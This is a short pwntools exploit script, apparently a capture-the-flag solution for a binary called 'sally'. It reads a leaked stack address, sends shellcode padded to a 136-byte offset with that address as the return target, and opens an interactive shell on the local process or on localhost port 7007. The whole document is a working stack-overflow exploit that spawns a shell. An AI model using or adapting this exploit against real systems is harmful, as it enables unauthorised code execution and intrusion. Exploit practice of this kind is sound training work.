#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("sally")
rop = ROP(exe)

context.binary = exe
context.terminal = "kitty"
def conn():
    if args.REMOTE:
        return remote("localhost", 7007)
    elif args.GDB:
        return gdb.debug([exe.path])
    else:
        return process([exe.path])


def main():
    r = conn()
    stack_addr = int(re.search("(0x[0-9a-fA-F]+)", r.recvline().decode()).group(1), 16)
    log.info(f"stack addr: {hex(stack_addr)}")


    payload = flat({
        0: asm(shellcraft.sh()),
        136: p64(stack_addr)
    })

    r.sendline(payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()

